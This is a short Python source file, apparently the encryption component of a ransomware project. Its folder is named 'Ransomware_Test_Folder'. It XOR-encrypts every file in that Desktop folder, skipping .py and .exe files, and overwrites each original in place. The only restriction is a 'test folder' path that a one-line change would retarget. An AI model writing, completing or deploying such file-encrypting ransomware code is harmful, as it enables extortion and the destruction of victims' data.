# crypto_engine.py
import os


def process_file_in_memory(file_path, key):
    """
    Reads file, XORs data in memory, writes back once.
    Prevents hard drive bottleneck.
    """
    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        processed_data = bytearray()
        key_len = len(key)

        # Fast XOR operation
        for i, byte in enumerate(data):
            xor_byte = byte ^ ord(key[i % key_len])
            processed_data.append(xor_byte)

        with open(file_path, 'wb') as f:
            f.write(processed_data)
        return True
    except Exception as e:
        print(f"Error processing {file_path}: {e}")
        return False


def get_target_files():
    """
    Safely targets ONLY the test folder.
    """
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    target_folder = os.path.join(desktop, 'Ransomware_Test_Folder')

    if not os.path.exists(target_folder):
        os.makedirs(target_folder)
        print(f"Created test folder at {target_folder}. Please add files to it.")
        return []

    files = []
    for f in os.listdir(target_folder):
        full_path = os.path.join(target_folder, f)
        if os.path.isfile(full_path) and not f.endswith('.py') and not f.endswith('.exe'):
            files.append(full_path)
    return files